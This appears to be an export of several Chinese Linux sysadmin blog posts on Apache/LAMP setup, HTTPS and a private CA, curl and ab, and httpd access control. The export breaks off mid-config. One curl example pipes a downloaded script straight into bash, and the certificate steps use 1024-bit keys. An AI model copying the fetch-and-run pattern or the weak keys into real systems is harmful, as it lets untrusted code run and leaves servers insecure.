http://download.comsenz.com/DiscuzX/3.3/Discuz_X3.3_SC_UTF8.zip $ unzip Discuz_X3.3_SC_UTF8.zip $ cd upload/ $ cp -r * /data/www/ $ cd /data/www $ setfacl -R -m u:apache:rwx /data/www ##下面网页配置完成后，记得收回权限，保证安全。 $ setfacl -R -b /data/www/ 访问http://localhost/,傻瓜式向导安装，第三步的时候数据库名和自己授权的数据库管理员账户是一致的即可。\n到此，基本完成安装。\n扩展试验wordpress安全加密 场景：访问wp-admin，wp-login时，需要我们管理服务器时，实现自动http跳转https，保证用户安全。\n访问blog等静态页面时，使用http协议传输。\n前提：搭建好lamp。\n证书申请 提供脚本生成证书，输入你的网站域名www.example.com,重复输入四次密码\n$ cat genca.sh #!/bin/sh # create self-signed server certificate: read -p \u0026quot;Enter your domain [www.example.com]: \u0026quot; DOMAIN echo \u0026quot;Create server key...\u0026quot; openssl genrsa -des3 -out $DOMAIN.key 1024 echo \u0026quot;Create server certificate signing request...\u0026quot; SUBJECT=\u0026quot;/C=US/ST=Mars/L=iTranswarp/O=iTranswarp/OU=iTranswarp/CN=$DOMAIN\u0026quot; openssl req -new -subj $SUBJECT -key $DOMAIN.key -out $DOMAIN.csr echo \u0026quot;Remove password...\u0026quot; mv $DOMAIN.key $DOMAIN.origin.key openssl rsa -in $DOMAIN.origin.key -out $DOMAIN.key echo \u0026quot;Sign SSL certificate...\u0026quot; openssl x509 -req -days 3650 -in $DOMAIN.csr -signkey $DOMAIN.key -out $DOMAIN.crt echo \u0026quot;TODO:\u0026quot; echo \u0026quot;Copy $DOMAIN.crt to /etc/nginx/ssl/$DOMAIN.crt\u0026quot; echo \u0026quot;Copy $DOMAIN.key to /etc/nginx/ssl/$DOMAIN.key\u0026quot; echo \u0026quot;Add configuration in nginx:\u0026quot; echo \u0026quot;server {\u0026quot; echo \u0026quot; ...\u0026quot; echo \u0026quot; listen 443 ssl;\u0026quot; echo \u0026quot; ssl_certificate /etc/nginx/ssl/$DOMAIN.crt;\u0026quot; echo \u0026quot; ssl_certificate_key /etc/nginx/ssl/$DOMAIN.key;\u0026quot; echo \u0026quot;}\u0026quot; $ ./genca.sh Enter your domain [www.example.com]: www.example.com $ ll -rw-r--r--. 1 root root 887 Jun 25 22:40 www.example.com.crt -rw-r--r--. 1 root root 668 Jun 25 22:40 www.example.com.csr -rw-r--r--. 1 root root 887 Jun 25 22:40 www.example.com.key -rw-r--r--. 1 root root 963 Jun 25 22:40 www.example.com.origin.key 配置虚拟主机 这里需要修改一下配置文件 /usr/local/apache/conf/httpd.conf 找到下面的一行 #Include conf/extra/httpd-ssl.conf 将前面的 # 注释去掉，保存。 将上面生成的www.example.com.crt和 www.example.com.key放在/app/httpd24/conf/extra/ssl/下\n$ vim conf.d/httpd-vhost.conf \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026#34;/app/httpd24/htdocs\u0026#34; ServerName www.example.com ErrorLog \u0026#34;logs/blog.com.error_log\u0026#34; TransferLog \u0026#34;logs/blog.com-access_log\u0026#34; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1 Header always set Strict-Transport-Security \u0026#34;max-age=31536000\u0026#34; RewriteEngine on RewriteRule ^(/wp-admin.*)$ https://%{HTTP_HOST}$1 [redirect=302] RewriteRule ^(/wp-login.*)$ https://%{HTTP_HOST}$1 [redirect=302] \u0026lt;directory /app/httpd24/htdocs\u0026gt; allowoverride None require all granted \u0026lt;/directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; $ vim conf.d/httpd-ssl.conf Listen 443 SSLCipherSuite HIGH:MEDIUM:!MD5:!RC4:!3DES SSLProxyCipherSuite HIGH:MEDIUM:!MD5:!RC4:!3DES SSLHonorCipherOrder on SSLProtocol all -SSLv3 SSLProxyProtocol all -SSLv3 SSLPassPhraseDialog builtin SSLSessionCache \u0026#34;shmcb:/app/httpd24/logs/ssl_scache(512000)\u0026#34; SSLSessionCacheTimeout 300 \u0026lt;VirtualHost _default_:443\u0026gt; DirectoryIndex index.php DocumentRoot \u0026#34;/app/httpd24/htdocs\u0026#34; ServerName www.example.com:443 ServerAdmin you@example.com ErrorLog \u0026#34;/app/httpd24/logs/error_log\u0026#34; TransferLog \u0026#34;/app/httpd24/logs/access_log\u0026#34; \u0026lt;Directory \u0026#34;/app/httpd24/htdocs\u0026#34;\u0026gt; Options -Indexes +FollowSymLinks AllowOverride All Require all granted \u0026lt;/Directory\u0026gt; AddType application/x-httpd-php .php AddType application/x-httpd-php-source .phps ProxyRequests Off ProxyPassMatch ^/(.*\\.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1 SSLEngine on SSLCertificateFile \u0026#34;/app/httpd24/conf/extra/ssl/www.example.com.crt\u0026#34; SSLCertificateKeyFile \u0026#34;/app/httpd24/conf/extra/ssl/www.example.com.key\u0026#34; \u0026lt;FilesMatch \u0026#34;\\.(cgi|shtml|phtml|php)$\u0026#34;\u0026gt; SSLOptions +StdEnvVars \u0026lt;/FilesMatch\u0026gt; \u0026lt;Directory \u0026#34;/app/httpd24/cgi-bin\u0026#34;\u0026gt; SSLOptions +StdEnvVars \u0026lt;/Directory\u0026gt; BrowserMatch \u0026#34;MSIE [2-5]\u0026#34; \\ nokeepalive ssl-unclean-shutdown \\ downgrade-1.0 force-response-1.0 CustomLog \u0026#34;/app/httpd24/logs/ssl_request_log\u0026#34; \\ \u0026#34;%t %h %{SSL_PROTOCOL}x %{SSL_CIPHER}x \\\u0026#34;%r\\\u0026#34; %b\u0026#34; \u0026lt;/VirtualHost\u0026gt; $ apachectl start 域名解析好后，这里需要把你生成的证书导入到chrome下，使用 Chrome 浏览器访问http://www.example.com/wp-admin，你就会看到你的网址自动跳转https了，而且前有个可爱的小绿锁了。\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-21-lamp/","tags":["Linux"],"title":"LAMP1"},{"categories":["Http"],"contents":"摘要：压力测试工具ab，访问工具curl，http状态码，https的实现过程\n压力测试工具ab ​\thttpd的压力测试工具，这里主要介绍ab\nab [OPTIONS] URL，来自httpd-tools包\noptions：\n -n：总请求数 -c：模拟的并行数 -k：以持久连接模式测试 ulimit –n # 调整能打开的文件数\n $ ab -c 100 -n 2000 http://192.168.1.8/huge.txt Server Software: Apache Server Hostname: 172.20.114.173 Server Port: 80 Document Path: /index.html Document Length: 27 bytes Concurrency Level: 100 Time taken for tests: 0.582 seconds Complete requests: 1000 Failed requests: 0 Write errors: 0 Total transferred: 272000 bytes HTML transferred: 27000 bytes Requests per second: 1718.83 [#/sec] (mean) Time per request: 58.179 [ms] (mean) Time per request: 0.582 [ms] (mean, across all concurrent requests) Transfer rate: 456.57 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 0 6 27.6 3 361 Processing: 5 50 105.8 17 387 Waiting: 1 49 105.4 17 387 Total: 12 56 108.6 22 393 Percentage of the requests served within a certain time (ms) 50% 22 66% 23 75% 24 80% 24 90% 29 95% 384 98% 389 99% 390 100% 393 (longest request) ab命令在一般系统上面做测试时候，一般并发不能超过1024个，其实是因为因为系统限制每个进程打开的最大文件数为1024，可以用ulimit -a来查看\ncurl ​\tcurl是基于URL语法在命令行方式下工作的文件传输工具，它支持FTP, FTPS,HTTP, HTTPS, GOPHER, TELNET, DICT, FILE及LDAP等协议。curl支持HTTPS认证，并且支持HTTP的POST、PUT等方法， FTP上传， kerberos认证，HTTP上传，代理服务器，cookies，用户名/密码认证， 下载文件断点续传，上载文件断点续传, http代理服务器管道（ proxy tunneling），还支持IPv6，socks5代理服务器，通过http代理服务器上传文件到FTP服务器等，功能十分强大.\n$ curl -I 192.168.1.8 $ curl -v 192.168.1.8 $ curl -A \u0026#34;ie20\u0026#34; 192.168.1.8 $ curl -e \u0026#34;www.baidu.com\u0026#34; 192.168.1.8 $ curl http://192.168.1.8/f1.sh -O $ curl http://192.168.1.8/f1.sh -o f11.sh $ curl http://192.168.1.8/f1.sh |bash $ curl -c cookie.txt 192.168.1.8/setcookie.php $ cat cookie.txt # Netscape HTTP Cookie File # http://curl.haxx.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk. 192.168.1.8\tFALSE\t/\tFALSE\t0\ttitle\tceo 192.168.1.8\tFALSE\t/\tFALSE\t1529553543\tname\twang HTTP协议相关 ​\thttp请求报文的模拟状态\n$telnet 192.168.1.8 80 Trying 192.168.1.8... Connected to 192.168.1.8. Escape character is '^]'. GET /index.html HTTP/1.1 host: 2.2.2.2 //需要enter两下，提交报文 HTTP/1.1 200 OK Date: Thu, 21 Jun 2018 06:37:23 GMT Server: Apache Last-Modified: Thu, 21 Jun 2018 06:28:49 GMT ETag: \u0026quot;11-56f210742b912\u0026quot; Accept-Ranges: bytes Content-Length: 17 Content-Type: text/html; charset=UTF-8 welcome to hong~ ​\thttp响应报文状态的获取查看，利用curl -I URL\n$curl -I 192.168.1.8 HTTP/1.1 200 OK Date: Thu, 21 Jun 2018 06:19:20 GMT Server: Apache Last-Modified: Wed, 20 Jun 2018 15:29:42 GMT ETag: \u0026quot;e-56f1477b8b86d\u0026quot; Accept-Ranges: bytes Content-Length: 14 Content-Type: text/html; charset=UTF-8 协议查看或分析的工具：tcpdump, wireshark,tshark\nhttp状态码 ​\t常见代码如下：\n1xx：100-101 信息提示 2xx：200-206 成功 3xx：300-305 重定向 4xx：400-415 错误类信息，客户端错误 5xx：500-505 错误类信息，服务器端错误 ​\t详细状态码如下：\n200： 成功，请求数据通过响应报文的entity-body部分发送;OK 301： 请求的URL指向的资源已经被删除；但在响应报文中通过首部Location指明了资源现在所处的新位置；Moved Permanently 302： 响应报文Location指明资源临时新位置 Moved Temporarily 304： 客户端发出了条件式请求，但服务器上的资源未曾发生改变，则通过响应此响应状态码通知客户端；Not Modified 401： 需要输入账号和密码认证方能访问资源；Unauthorized 403： 请求被禁止；Forbidden 404： 服务器无法找到客户端请求的资源；Not Found 500： 服务器内部错误；Internal Server Error 502： 代理服务器从后端服务器收到了一条伪响应，如无法连接到网关；BadGateway 503: 服务不可用，临时服务器维护或过载，服务器无法处理请求 504: 网关超时 Cookie ​\tHTTP 是一种无状态协议。协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。可是随着 Web 的不断发展，很多业务都需要对通信状态进行保存。于是引入了 Cookie 技术。使用 Cookie 的状态管理Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。\n$ yum install php $ cd /var/www/html $ vim setcookie.php \u0026lt;?php\u0026gt; setcookie(\u0026quot;title\u0026quot;,'ceo'); setcookie(\u0026quot;name\u0026quot;,'wang',time()+86400); ?\u0026gt; $ systemctl restart httpd $ curl -v 192.168.1.8/setcookie.php * About to connect() to 192.168.1.8 port 80 (#0) * Trying 192.168.1.8... * Connected to 192.168.1.8 (192.168.1.8) port 80 (#0) \u0026gt; GET /setcookie.php HTTP/1.1 \u0026gt; User-Agent: curl/7.29.0 \u0026gt; Host: 192.168.1.8 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 200 OK \u0026lt; Date: Thu, 21 Jun 2018 06:40:31 GMT \u0026lt; Server: Apache \u0026lt; X-Powered-By: PHP/5.4.16 \u0026lt; Set-Cookie: title=ceo \u0026lt; Set-Cookie: name=wang; expires=Fri, 22-Jun-2018 06:40:32 GMT \u0026lt; Content-Length: 0 \u0026lt; Content-Type: text/html; charset=UTF-8 \u0026lt; * Connection #0 to host 192.168.1.8 left intact HTTPS  https：http over ssl SSL会话的简化过程     客户端发送可供选择的加密方式，并向服务器请求证书\n  服务器端发送证书以及选定的加密方式给客户端\n  客户端取得证书并进行证书验证,如果信任给其发证书的CA: 验证证书来源的合法性；用CA的公钥解密证书上数字签名 验证证书的内容的合法性：完整性验证 检查证书的有效期限 检查证书是否被吊销 证书中拥有者的名字，与访问的目标主机要一致\n  客户端生成临时会话密钥（对称密钥），并使用服务器端的公钥加密此数据发送给服务器,完成密钥交换\n  服务用此密钥加密用户请求的资源，响应给客户端\n    注意：SSL是基于IP地址实现,单IP的主机仅可以使用一个https虚拟主机  实验：模拟https的实现过程 ​\thttps服务器的实现过程，生成ssl文件夹，放置证书相关文件，然后发送申请文件，等待CA发送httpd.cert证书。\n$ mkdir /etc/httpd/conf.d/ssl $ cd /etc/httpd/conf.d/ssl $ (umask 077;openssl genrsa -out httpd.key 1024) Generating RSA private key, 1024 bit long modulus .....................................................++++++ ...........................++++++ e is 65537 (0x10001) $openssl req -new -key httpd.key -out httpd.csr Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:beijing Locality Name (eg, city) [Default City]:beijing Organization Name (eg, company) [Default Company Ltd]:httpd Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server's hostname) []:www.httpd.com Email Address []: Please enter the following 'extra' attributes to be sent with your certificate request A challenge password []: An optional company name []: ssl]#scp httpd.csr 192.168.1.11:/etc/pki/CA/ The authenticity of host '192.168.1.11 (192.168.1.11)' can't be established. ECDSA key fingerprint is SHA256:rwE9SvvRx3QSIGMK/vhD6ta3/HdDO4BykxP4Mumjs00. ECDSA key fingerprint is MD5:31:d3:62:71:12:6a:f6:88:69:a4:95:4e:15:57:48:0a. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '192.168.1.11' (ECDSA) to the list of known hosts. root@192.168.1.11's password: httpd.csr 100% 651 435.0KB/s 00:00 ​\tCA颁发证书过程，先自签名证书，csr申请的信息必须与rootca前面的信息一致。\n$ cd /etc/pki/CA/ $ (umask 077;openssl genrsa -out private/cakey.pem 2048) Generating RSA private key, 2048 bit long modulus .+++ .....................................................+++ e is 65537 (0x10001) $openssl req -new -x509 -key private/cakey.pem -out cacert.pem -days 3650 Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:beijing Locality Name (eg, city) [Default City]:beijing Organization Name (eg, company) [Default Company Ltd]:httpd Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server's hostname) []:ca.httpd.com Email Address []: ​\t然后rootCA签署httpd.csr,生成httpd.crt，再发送到https服务器\n$ touch index.txt $ echo 01 \u0026gt; serial $openssl ca -in httpd.csr -out certs/http.crt -days 720 Using configuration from /etc/pki/tls/openssl.cnf Check that the request matches the signature Signature ok $tree . ├── cacert.pem ├── certs │ └── http.crt ├── crl ├── httpd.csr ├── index.txt ├── index.txt.attr ├── index.txt.old ├── newcerts │ └── 01.pem ├── private │ └── cakey.pem ├── serial └── serial.old $scp certs/http.crt 192.168.1.8:/etc/httpd/conf.d/ssl/ root@192.168.1.8's password: http.crt 100% 3699 2.2MB/s 00:00 ​ https服务器收到证书后，安装install mod_ssl,修改相关的配置文件，开启https服务\n$ yum install mod_ssl $ vim /etc/httpd/conf.d/ssl.conf SSLCertificateFile /etc/httpd/conf.d/ssl/httpd.crt SSLCertificateKeyFile /etc/httpd/conf.d/ssl/httpd.key SSLCACertificateFile /etc/httpd/conf.d/ssl/cacert.pem $ systemctl restart httpd ​\t实验验证,在图形界面下访问,简单的添加hosts文件，实现免dns解析。\n$ vim /etc/hosts/ 192.168.1.8 www.httpd.com $ firefox https://www.httpd.com ​\t可能这里在浏览器里，大家看到的提示依旧不安全，这是因为证书没有导入的信任的缘故。导入证书即可变绿加🔒\nhttp 重定向到 https ​\t将http请求转发至https的URL\n​\tRedirect [status] URL-path URL\n$ vim /etc/httpd/conf.d/test.conf redirect Permanent / https://www.httpd.com/ $ systemctl restart httpd 利用curl命令验证一下,的确进行了跳转。\n$curl -I http://192.168.1.8/ HTTP/1.1 301 Moved Permanently Date: Thu, 21 Jun 2018 08:22:49 GMT Server: Apache Location: https://www.httpd.com/ Content-Type: text/html; charset=iso-8859-1 HSTS   HSTS:HTTP Strict Transport Security\n服务器端配置支持HSTS后，会在给浏览器返回的HTTP首部中携带HSTS字段。浏览器获取到该信息后，会将所有HTTP访问请求在内部做307跳转到HTTPS。而无需任何网络过程\n  HSTS preload list\n是Chrome浏览器中的HSTS预载入列表，在该列表中的网站，使用Chrome浏览器访问时，会自动转换成HTTPS。Firefox、Safari、Edge浏览器也会采用这个列表\n  $ vim /etc/httpd/conf.d/test.conf Header always set Strict-Transport-Security \u0026quot;max-age=31536000\u0026quot; RewriteEngine on RewriteRule ^(/.*)$ https://%{HTTP_HOST}$1 [redirect=302] $ systemctl restart httpd ​\t实验验证一下，的确进行了跳转。\n$curl -I http://192.168.1.8/ HTTP/1.1 302 Found Date: Thu, 21 Jun 2018 08:19:20 GMT Server: Apache Strict-Transport-Security: max-age=31536000 Location: https://192.168.1.8/ Content-Type: text/html; charset=iso-8859-1 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-21-http_apache2/","tags":["Linux"],"title":"Http(Apache2)"},{"categories":["Http"],"contents":"摘要：Apache的httpd服务常见配置解析，配置文件的实验\u0026mdash;-\nhttpd 2.4常见配置 grep -v '^$\\|^\\s*#' /etc/httpd/conf/httpd.conf,查看配置文件的非注释内容。\n网站家目录/服务器版本/监听端口的修改 centos7版本的http服务，更换documentroot的时候，需要放开权限，才能实现访问，不然会报404错误，另外apache服务的版本号的隐藏，在ServerTokens语句块中，修改为Prod即可,很多大型的网站，如京东，淘宝，apache或者nginx的版本号都会隐藏。监听端口的配置修改，配置文件中加入listen 80，http监听端口默认80\n$ vim /etc/httpd/conf.d/test.conf ServerRoot \u0026#39;/etc/httpd\u0026#39; ServerTokens Prod #curl -I http://192.168.1.8 listen 192.168.1.8:80 StartServers 20 StartThreads 50 DocumentRoot \u0026#34;/data/www/\u0026#34; \u0026lt;Directory \u0026#34;/data/www\u0026#34;\u0026gt; \u0026lt;RequireAll\u0026gt; Require all granted Require not ip 192.168.1.17 \u0026lt;/RequireAll\u0026gt; \u0026lt;/Directory\u0026gt; $ systemctl restart httpd $curl -I 192.168.1.8 HTTP/1.1 200 OK Date: Wed, 20 Jun 2018 11:38:30 GMT Server: Apache Last-Modified: Wed, 20 Jun 2018 11:37:49 GMT ETag: \u0026#34;6-56f113a6fe504\u0026#34; Accept-Ranges: bytes Content-Length: 6 Content-Type: text/html; charset=UTF-8 在禁止访问的主机ip为192.168.1.11上访问,会出现Forbidden 403，在其他的授权主机上即可正常访问。\n$curl -I 192.168.1.8 HTTP/1.1 403 Forbidden Date: Wed, 20 Jun 2018 11:39:39 GMT Server: Apache Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT ETag: \u0026quot;1321-5058a1e728280\u0026quot; Accept-Ranges: bytes Content-Length: 4897 Content-Type: text/html; charset=UTF-8 持久链接 系统默认的持久链接为5s，时间较短，可以稍微调大。\n$ vim /etc/httpd/conf.d/test.conf KeepAlivetimeout 50 #持久链接 MaxKeepAliveRequests 100 $ systemctl restart httpd $ telnet /192.168.1.8 HTTP/1.1 GET /index.html HOST:6.6.6.6 MPM三种工作模式  refork：多进程I/O模型，每个进程响应一个请求，默认模型 一个主进程：生成和回收n个子进程，创建套接字，不响应请求 多个子进程：工作work进程，每个子进程处理一个请求；系统初始时，预先生成多个空闲进程，等待请求，最大不超过1024个\n  worker：复用的多进程I/O模型,多进程多线程，IIS使用此模型 一个主进程：生成m个子进程，每个子进程负责生个n个线程，每个线程响应一个请求，并发响应请求：m*n\n  event：事件驱动模型（worker模型的变种） 一个主进程：生成m个子进程，每个进程直接响应n个请求，并发响应请求：m*n，有专门的线程来管理这些keep-alive类型的线程，当有真实请求时，将请求传递给服务线程，执行完毕后，又允许释放。这样增强了高并发场景下的请求处理能力，示意图入下\n 修改配置文件/etc/httpd/conf.modules.d/00-mpm.conf，改变MPM工作模式\nLoadModule mpm_prefork_module modules/mod_mpm_prefork.so #LoadModule mpm_worker_module modules/mod_mpm_worker.so #LoadModule mpm_event_module modules/mod_mpm_event.so 经ab测试比对，发现prefork和event模块工作并无大的差别。\n访问控制 基于用户的访问控制\n  认证质询：WWW-Authenticate：响应码为401，拒绝客户端请求，并说明要求客户端提供账号和密码\n  认证：Authorization：客户端用户填入账号和密码后再次发送请求报文；认证通过时，则服务器发送响应的资源\n  认证方式两种：\nbasic：明文 digest：消息摘要认证,兼容性差\n  安全域：需要用户认证后方能访问的路径；应该通过名称对其进行标识，以便于告知用户认证的原因\n  \u0026lt;Directory \u0026#34;/data/www\u0026#34;\u0026gt; \u0026lt;RequireAll\u0026gt; Require all granted \u0026lt;/ReqireAll\u0026gt; \u0026lt;/Directory\u0026gt; \u0026lt;Files \u0026#34;*.conf\u0026#34;\u0026gt; Require all denied \u0026lt;/Files\u0026gt; \u0026lt;Filesmatch \u0026#34;\\.(conf|ini)$\u0026#34;\u0026gt; Require all denied \u0026lt;/Filesmatch\u0026gt; \u0026lt;Location \u0026#34;/conf\u0026#34;\u0026gt; \u0026lt;RequireAny\u0026gt; Require all denied Require ip 192.168.1.11 \u0026lt;/RequireAny\u0026gt; \u0026lt;/Location\u0026gt; 完成配置文件后，重启服务，进行实验效果,在其他主机上进行访问，.conf文件的确不能访问。\n$curl 192.168.1.8/php.conf \u0026lt;!DOCTYPE HTML PUBLIC \u0026quot;-//IETF//DTD HTML 2.0//EN\u0026quot;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Forbidden\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You don't have permission to access /php.conf on this server.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; $curl 192.168.1.8/index.html test1 中**“基于源地址”实现访问控制**\noptions：禁止软连接-FollowSymlinks\nIndexes:文件索引列表，搭建yum仓库可以用到,此项结合注释conf.d/welcome.conf,不然会报错\n$ vim /etc/httpd/conf.d/test.conf \u0026lt;Directory \u0026quot;/data/www\u0026quot;\u0026gt; Require all granted options +Indexes -FollowSymlinks \u0026lt;/Directory\u0026gt; $ ll /data/www total 24 lrwxrwxrwx 1 root root 11 Jun 20 20:06 hexo -\u0026gt; /data/hexo/ 重启服务后，进行访问实验,hexo文件夹为软连接,禁用软连接后，文件夹不能访问了。indexes的确是类似yum仓库的路径。\n$ links 192.168.1.8/hexo Forbidden You don't have permission to access /hexo/ on this server. AllowOverride: 与访问控制相关的哪些指令可以放在指定目录下的.htaccess（由AccessFileName指定）文件中，覆盖之前的配置指令,只对语句有效\nAllowOverride All: 所有指令都有效 AllowOverride None：.htaccess 文件无效 AllowOverride AuthConfig Indexes 除了AuthConfig 和Indexes的其它指令都无法覆盖 身份验证   htpasswd :默认是MD5加密\n  htpasswd [options] /PATH/HTTPD_PASSWD_FILE username -c：自动创建文件，仅应该在文件不存在时使用 -p：明文密码 -d：CRYPT格式加密，默认 -m：md5格式加密 -s: sha格式加密 -D：删除指定用户\n  group需要手动创建\n  我们需要先按照htpassword生成用户名和密码。第一次需要带-c选项\n$ htpasswd -c /etc/httpd/conf.d/.httpuser tom $ htpasswd -s /etc/httpd/conf.d/.httpuser jerry $ cat /etc/httpd/conf.d/.httpuser user1:$apr1$O8G3R9KG$AjOvrOCyxNGXZC6Sm.Kx3. user2:{SHA}QL0AFWMIX8NRZTKeof9cXsvbvu8= $ vim /etc/httpd/conf.d/.httpgroup g1: tom jerry  修改配置文件如下，然后重启服务，用户访问需要用到上面设置的用户和密码进行登录验证，由于是基于http服务，并没有加密，因此，容易被劫持然后被查询明文密码，是巨大的安全隐患。此项一般是配合https进行实现；实现方法1  $ vim /etc/httpd/conf.d/test.conf \u0026lt;Directory \u0026quot;/data/www/admin\u0026quot;\u0026gt; AuthType Basic AuthName \u0026quot;String\u0026quot; AuthUserFile \u0026quot;/etc/httpd/conf.d/.httpuser\u0026quot; Require user tom jerry \u0026lt;/Directory\u0026gt; $ systemctl restart httpd  实现方法2  $ vim /etc/httpd/conf.d/test.conf \u0026lt;Directory \u0026quot;/data/www/admin\u0026quot;\u0026gt; allowoverride authconfig \u0026lt;/Directory\u0026gt; $ vim /data/www/admin/.htaccess AuthType Basic AuthName \u0026quot;String\u0026quot; AuthUserFile \u0026quot;/etc/httpd/conf.d/.httpuser\u0026quot; #AuthGroupFile \u0026quot;/etc/httpd/conf.d/.httpgroup\u0026quot; #Require group g1 Require user tom jerry 日志 ErrorLog \u0026quot;logs/error_log\u0026quot; LogLevel warn \u0026lt;IfModule log_config_module\u0026gt; LogFormat \u0026quot;%h %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b \\\u0026quot;%{Referer}i\\\u0026quot; \\\u0026quot;%{User-Agent}i\\\u0026quot;\u0026quot; combined LogFormat \u0026quot;%h %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b\u0026quot; common %h\t---\u0026gt; 主机IP %l %u\t---\u0026gt; 登录相关用户信息 %t ---\u0026gt; 时间格式GMT %r\t---\u0026gt; 第一行的请求 %{Referer}i ---\u0026gt; 前一网站跳转的地址 %{User-Agent}i ---\u0026gt; 客户端使用的浏览器 目录别名 格式： Alias /URL/ \u0026quot;/PATH/\u0026quot;\n$ vim /etc/httpd/conf.d/test.conf \u0026lt;Directory \u0026quot;/data/hexo/categories\u0026quot;\u0026gt; Require all granted \u0026lt;/Directory\u0026gt; alias /hc /data/hexo/categories 访问http://192.168.1.8/hc/，即相当于访问系统的path：/data/hexo/categories\n实现用户家目录的http共享  基于模块mod_userdir.so实现 SELinux: http_enable_homedirs 相关设置：启用家目录http共享,配置文件如下，并只允许特定user访问，但是基于http仍然存在安全隐患  $ vim /etc/httpd/conf.d/userdir.conf ··· \u0026lt;IfModule mod_userdir.c\u0026gt; #UserDir disabled UserDir public_html #指定共享目录的名称 ··· \u0026lt;/IfModule\u0026gt; \u0026lt;Directory \u0026quot;/home/hong/public_html\u0026quot;\u0026gt; AuthType Basic AuthName \u0026quot;hong home dir\u0026quot; AuthUserFile \u0026quot;/etc/httpd/conf.d/.httpuser\u0026quot; Require user hong \u0026lt;/Directory\u0026gt;  准备家目录的相关文件及权限。  su - hong;mkdir ~/public_html；echo welcome to hong~ \u0026gt; ~/public_html/index.html setfacl –m u:apache:x ~hong  访问:http://localhost/~hong/index.html  server-status LoadModule: status_module ,在配置文件中modules/mod_status.so，可以用httpd -M查看。\n实现状态页\n$ httpd -M |grep 'status' status_module (shared) $ vim /etc/httpd/conf.d/test.conf \u0026lt;Location /status\u0026gt; #url路径 SetHandler server-status Order allow,deny Allow from 192.168. \u0026lt;/Location\u0026gt; $ systemctl restart httpd 压力测试，并在浏览器中查询服务器状态http://localhost/status\n$ ab -c 500 -n 20000 http://192.168.1.8/m.txt 虚拟主机   站点标识： socket\nIP相同，但端口不同 IP不同，但端口均为默认端口 FQDN不同： 请求报文中首部 Host: www.magedu.com\n  有三种实现方案： 基于ip：为每个虚拟主机准备至少一个ip地址 基于port：为每个虚拟主机使用至少一个独立的port 基于FQDN：为每个虚拟主机使用至少一个FQDN\n  注意：一般虚拟机不要与main主机混用；因此，要使用虚拟主机，一般先禁用main主机 禁用方法：注释中心主机的DocumentRoot指令即可\n  准备工作\n$mkdir /data/web{1,2,3} $echo www.test1.com \u0026gt; /data/web1/index.html $echo www.test2.com \u0026gt; /data/web2/index.html $echo www.test3.com \u0026gt; /data/web3/index.html 实验一：基于Port 更改端口，完成虚拟主机的服务。默认已经完成准备工作\n$ vim /etc/httpd/conf.d/test.conf listen 81 listen 82 listen 83 \u0026lt;directory /data/\u0026gt; require all granted \u0026lt;/directory\u0026gt; \u0026lt;VirtualHost *:81\u0026gt; DocumentRoot \u0026quot;/data/web1\u0026quot; ServerName www.test1.com ErrorLog \u0026quot;logs/test1.com.error_log\u0026quot; TransferLog \u0026quot;logs/test1.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:82\u0026gt; DocumentRoot \u0026quot;/data/web2\u0026quot; ServerName www.test2.com ErrorLog \u0026quot;logs/test2.com.error_log\u0026quot; TransferLog \u0026quot;logs/test2.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:83\u0026gt; DocumentRoot \u0026quot;/data/web3\u0026quot; ServerName www.test3.com ErrorLog \u0026quot;logs/test3.com.error_log\u0026quot; TransferLog \u0026quot;logs/test3.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; ​\t在另外一台主机上，验证实验结果\n$ curl http://192.168.1.8:81 www.test1.com $curl http://192.168.1.8:82 www.test2.com $curl http://192.168.1.8:83 www.test3.com 实验二：基于IP的虚拟主机, ​\t先添加3个ip，这里采用的是ifconfig。然后修改配置文件，主要修改\u0026lt;VirtualHost 192.168.1.11:80\u0026gt;\n$ ifconfig ens33:0 192.168.1.11 netmask 255.255.255.0 up $ ifconfig ens33:1 192.168.1.22 netmask 255.255.255.0 up $ ifconfig ens33:2 192.168.1.33 netmask 255.255.255.0 up $ vim /etc/httpd/conf.d/test.conf \u0026lt;directory /data/\u0026gt; require all granted \u0026lt;/directory\u0026gt; \u0026lt;VirtualHost 192.168.1.11:80\u0026gt; DocumentRoot \u0026quot;/data/web1\u0026quot; ServerName www.test1.com ErrorLog \u0026quot;logs/test1.com.error_log\u0026quot; TransferLog \u0026quot;logs/test1.com-access_log\u0026quot; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost 